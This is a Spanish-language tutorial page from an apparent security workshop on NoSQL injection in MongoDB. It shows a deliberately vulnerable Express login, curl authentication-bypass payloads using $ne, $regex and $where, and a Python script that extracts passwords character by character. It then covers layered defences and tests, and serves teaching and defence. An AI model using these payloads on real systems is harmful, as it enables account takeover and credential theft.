---
sidebar_position: 4
title: "Inyecciones NoSQL"
---

# Inyecciones NoSQL

## ¿Qué es NoSQL Injection?

NoSQL Injection es el equivalente moderno de la clásica SQL Injection, adaptado a bases de datos NoSQL como MongoDB, CouchDB, o Firebase. Aunque estas bases de datos no usan SQL, son igualmente vulnerables a inyecciones cuando los datos del usuario se incorporan directamente en las queries sin validación.

En el caso de MongoDB, las queries son objetos JavaScript. Si un atacante puede controlar la estructura de estos objetos (no solo sus valores), puede manipular completamente la lógica de la consulta.

### ¿Por qué es diferente a SQL Injection?

En SQL Injection clásico, el atacante inyecta fragmentos de sintaxis SQL:
```sql
-- Input del atacante: ' OR '1'='1
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
-- Retorna todos los usuarios
```

En NoSQL Injection con MongoDB, el atacante inyecta estructuras de objetos:
```javascript
// Input del atacante: { "$ne": null }
db.users.find({ username: { $ne: null }, password: { $ne: null } })
// Retorna todos los usuarios donde username y password no son null
```

---

## Anatomía del Ataque

### Operadores de MongoDB explotables

MongoDB proporciona operadores de comparación y lógicos que comienzan con `$`. Si estos operadores pueden ser inyectados por el usuario, se produce la vulnerabilidad:

| Operador | Significado | Query legítima | Query inyectada |
|----------|-------------|----------------|-----------------|
| `$ne` | Not equal | `{ status: { $ne: 'deleted' } }` | `{ password: { $ne: '' } }` → cualquier password no vacío |
| `$gt` | Greater than | `{ age: { $gt: 18 } }` | `{ password: { $gt: '' } }` → cualquier password |
| `$gte` | Greater or equal | `{ price: { $gte: 100 } }` | `{ password: { $gte: '' } }` → cualquier password |
| `$lt` | Less than | `{ stock: { $lt: 10 } }` | Menos útil para auth bypass |
| `$in` | In array | `{ status: { $in: ['active', 'pending'] } }` | `{ password: { $in: [passwords] } }` |
| `$regex` | Regular expression | `{ name: { $regex: 'john', $options: 'i' } }` | `{ password: { $regex: '.*' } }` → cualquier string |
| `$exists` | Field exists | `{ avatar: { $exists: true } }` | `{ password: { $exists: true } }` |
| `$where` | JavaScript eval | `{ $where: 'this.age > 18' }` | `{ $where: 'this.isAdmin' }` → bypass de roles |

### Código Vulnerable

Veamos un endpoint de login vulnerable típico:

```typescript
// ❌ CÓDIGO VULNERABLE

import { Router } from 'express';
import { MongoClient } from 'mongodb';

const router = Router();

router.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Conectar a MongoDB directamente
  const client = new MongoClient(process.env.MONGO_URI);
  const db = client.db('myapp');
  
  // VULNERABLE: email y password van directo a la query
  // Si email = { "$ne": null }, busca email != null
  const user = await db.collection('users').findOne({ 
    email: email,      // ← Sin validación de tipo
    password: password // ← Sin validación de tipo
  });
  
  if (user) {
    const token = generateToken(user);
    return res.json({ token, user });
  }
  
  return res.status(401).json({ error: 'Invalid credentials' });
});
```

### Explotación paso a paso

**Paso 1: Request normal**

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "usuario@example.com",
    "password": "mipassword123"
  }'
```

Query MongoDB resultante:
```javascript
db.users.findOne({ 
  email: "usuario@example.com", 
  password: "mipassword123" 
})
```
Comportamiento normal: solo retorna usuario si credenciales coinciden.

**Paso 2: Request maliciosa**

```bash
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$ne": null},
    "password": {"$ne": null}
  }'
```

Query MongoDB resultante:
```javascript
db.users.findOne({ 
  email: { $ne: null },     // email != null (cualquier email)
  password: { $ne: null }   // password != null (cualquier password)
})
```
Resultado: **Retorna el primer usuario de la base de datos** sin verificar credenciales.

**Paso 3: Variaciones del ataque**

```bash
# Atacar usuario específico conociendo solo el email
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com",
    "password": {"$ne": ""}
  }'

# Usar regex para encontrar admin
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": {"$regex": "admin"},
    "password": {"$gt": ""}
  }'

# Usar $where para lógica compleja (muy peligroso)
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "$where": "this.role === \"admin\""
  }'
```

---

## Escenario de ataque más sofisticado

### Extracción de datos con $regex

Un atacante paciente puede extraer passwords carácter por carácter usando `$regex`:

```bash
# ¿El password del admin empieza con 'a'?
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com",
    "password": {"$regex": "^a"}
  }'
# Si login exitoso → el password empieza con 'a'
# Si falla → probar otra letra

# ¿El password empieza con 'ab'?
curl -X POST http://localhost:3000/api/login \
  -d '{"email": "admin@example.com", "password": {"$regex": "^ab"}}'

# ¿El password empieza con 'abc'?
curl -X POST http://localhost:3000/api/login \
  -d '{"email": "admin@example.com", "password": {"$regex": "^abc"}}'

# Continuar hasta extraer el password completo...
```

Este ataque es automatizable con un script:

```python
import requests
import string

url = "http://localhost:3000/api/login"
charset = string.ascii_letters + string.digits + string.punctuation
password = ""

while True:
    found = False
    for char in charset:
        test_password = password + char
        response = requests.post(url, json={
            "email": "admin@example.com",
            "password": {"$regex": f"^{test_password}"}
        })
        
        if response.status_code == 200:
            password += char
            print(f"Password parcial: {password}")
            found = True
            break
    
    if not found:
        break

print(f"Password completo: {password}")
```

---

## Prevención en Taller-Testing-Security

El proyecto implementa múltiples capas de defensa que trabajan juntas para prevenir NoSQL Injection:

### 1. Mongoose Schema Types

Mongoose actúa como un ORM que define tipos estrictos para cada campo. Cuando un valor no coincide con el tipo esperado, Mongoose intenta convertirlo:

```typescript
// api/src/components/User/model.ts

import mongoose, { Document, Schema } from 'mongoose';

export interface IUserModel extends Document {
  email: string;
  password: string;
}

const UserSchema = new Schema<IUserModel>({
  email: {
    type: String,      // ← Tipo definido como String
    required: true,
    unique: true,
    lowercase: true,
    trim: true,
  },
  password: {
    type: String,      // ← Tipo definido como String
    required: true,
    select: false,
  }
});

export default mongoose.model<IUserModel>('User', UserSchema);
```

**¿Qué pasa cuando el atacante envía un objeto?**

```typescript
// Input del atacante
const attackPayload = {
  email: { "$ne": null },
  password: { "$ne": null }
};

// Mongoose internamente hace:
// 1. Mira el schema: email tiene type: String
// 2. Intenta convertir { "$ne": null } a String
// 3. En JavaScript: String({ "$ne": null }) → "[object Object]"
// 4. Query final que ejecuta MongoDB:
db.users.findOne({ 
  email: "[object Object]", 
  password: "[object Object]" 
})
// 5. No existe ningún usuario con email "[object Object]"
// 6. findOne retorna null → Login falla

// ¡La inyección fue neutralizada por la coerción de tipos!
```

### 2. Validación con Joi

Joi valida la estructura de los datos antes de que lleguen a Mongoose:

```typescript
// api/src/validation/auth.validation.ts

import Joi from 'joi';

export const loginSchema = Joi.object({
  email: Joi.string()    // ← Debe ser un string
    .email()             // ← Debe tener formato de email
    .required(),
    
  password: Joi.string() // ← Debe ser un string
    .min(6)              // ← Mínimo 6 caracteres
    .required(),
});
```

**Validación en acción:**

```typescript
// Input del atacante
const attackPayload = {
  email: { "$ne": null },
  password: { "$ne": null }
};

// Joi valida
const { error, value } = loginSchema.validate(attackPayload);

// Error generado:
// {
//   "message": "Validation error",
//   "errors": [
//     {
//       "field": "email",
//       "message": "\"email\" must be a string",
//       "type": "string.base"
//     },
//     {
//       "field": "password", 
//       "message": "\"password\" must be a string",
//       "type": "string.base"
//     }
//   ]
// }

// La request es rechazada con 400 Bad Request
// Nunca llega a MongoDB
```

### 3. Arquitectura segura de autenticación

El proyecto nunca busca por password en la base de datos. En su lugar:

```typescript
// api/src/components/Auth/service.ts

import bcrypt from 'bcrypt';
import User from '../User/model';

export async function authenticate(
  email: string, 
  password: string
): Promise<IUserModel> {
  // 1. Buscar SOLO por email
  // El password NUNCA va en la query a MongoDB
  const user = await User.findOne({ email }).select('+password');
  
  if (!user) {
    throw new Error('Invalid credentials');
  }
  
  // 2. Comparar password con bcrypt
  // bcrypt.compare es timing-safe (previene timing attacks)
  const isValidPassword = await bcrypt.compare(password, user.password);
  
  if (!isValidPassword) {
    throw new Error('Invalid credentials');
  }
  
  return user;
}
```

**¿Por qué esta arquitectura es segura?**

```text
┌─────────────────────────────────────────────────────────────────────┐
│                ARQUITECTURA SEGURA DE LOGIN                         │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  Request: { email: {$ne: null}, password: {$ne: null} }             │
│                                                                     │
│  CAPA 1: Joi Validation                                             │
│  ├─ email debe ser string → {$ne: null} no es string               │
│  └─ BLOQUEADO con 400 Bad Request                                   │
│                                                                     │
│  ─────────────────────────────────────────────────────────────────  │
│                                                                     │
│  Si Joi fallara (hipotéticamente):                                  │
│                                                                     │
│  CAPA 2: Mongoose Types                                             │
│  ├─ email: String → {$ne: null} se convierte a "[object Object]"   │
│  └─ Query: { email: "[object Object]" } → No encuentra usuario     │
│                                                                     │
│  ─────────────────────────────────────────────────────────────────  │
│                                                                     │
│  Si Mongoose fallara (hipotéticamente):                             │
│                                                                     │
│  CAPA 3: Arquitectura de Servicio                                   │
│  ├─ Query solo por email: findOne({ email })                        │
│  ├─ Password NUNCA está en la query MongoDB                         │
│  ├─ Comparación con bcrypt.compare() fuera de la base de datos      │
│  └─ No hay forma de bypassear bcrypt con operadores MongoDB         │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 4. Sanitización de operadores MongoDB

Como defensa adicional, puedes crear un middleware que rechace cualquier campo que contenga operadores `$`:

```typescript
// api/src/middleware/mongoSanitize.ts

import { Request, Response, NextFunction } from 'express';

/**
 * Middleware que rechaza requests con operadores MongoDB
 * Previene NoSQL Injection incluso si otras capas fallan
 */
export function mongoSanitize(
  req: Request, 
  res: Response, 
  next: NextFunction
): void {
  const hasDollarSign = (obj: any): boolean => {
    if (typeof obj !== 'object' || obj === null) {
      return false;
    }
    
    for (const key of Object.keys(obj)) {
      // Detectar claves que empiezan con $
      if (key.startsWith('$')) {
        return true;
      }
      // Recursivamente buscar en objetos anidados
      if (typeof obj[key] === 'object' && hasDollarSign(obj[key])) {
        return true;
      }
    }
    
    return false;
  };
  
  if (hasDollarSign(req.body)) {
    return res.status(400).json({
      error: 'Invalid request: MongoDB operators not allowed'
    });
  }
  
  if (hasDollarSign(req.query)) {
    return res.status(400).json({
      error: 'Invalid request: MongoDB operators not allowed'
    });
  }
  
  next();
}

// Uso en Express
import express from 'express';
import { mongoSanitize } from './middleware/mongoSanitize';

const app = express();
app.use(express.json());
app.use(mongoSanitize);  // ← Aplicar a todas las rutas
```

También puedes usar la librería `express-mongo-sanitize`:

```bash
npm install express-mongo-sanitize
```

```typescript
import mongoSanitize from 'express-mongo-sanitize';

app.use(mongoSanitize({
  replaceWith: '_',  // Reemplaza $ con _
  onSanitize: ({ key, req }) => {
    console.warn(`Blocked MongoDB operator in field: ${key}`);
  }
}));
```

---

## Demostración práctica

### Test de seguridad contra NoSQL Injection

```bash
# 1. Intento con operador $ne
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'

# Respuesta esperada: 400 Bad Request
# { "message": "Validation error", "errors": [...] }

# 2. Intento con operador $gt  
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@test.com", "password": {"$gt": ""}}'

# Respuesta esperada: 400 Bad Request

# 3. Intento con $regex
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$regex": "admin"}, "password": {"$regex": ".*"}}'

# Respuesta esperada: 400 Bad Request

# 4. Login legítimo (para comparar)
curl -X POST http://localhost:4000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "test@test.com", "password": "password123"}'

# Respuesta esperada: 200 OK con token (si las credenciales son válidas)
```

---

## Checklist de Prevención NoSQL Injection

```text
□ Usar un ODM como Mongoose con schemas tipados
□ Validar tipos de datos con Joi/Zod antes de procesar
□ Nunca usar contraseñas en queries a la base de datos
□ Comparar passwords con bcrypt.compare() fuera de MongoDB
□ Sanitizar inputs para rechazar operadores $ 
□ Usar express-mongo-sanitize o middleware equivalente
□ Deshabilitar $where y mapReduce si no son necesarios
□ Configurar roles de MongoDB con mínimos privilegios
□ Auditar queries en logs para detectar patrones sospechosos
□ Usar parameterized queries cuando trabajes con drivers directos
```

---

## Próximo Paso

Ahora que entiendes las inyecciones, veamos la vulnerabilidad #1 del OWASP Top 10: el control de acceso deficiente. Continúa con **[Broken Access Control](./access-control)**.
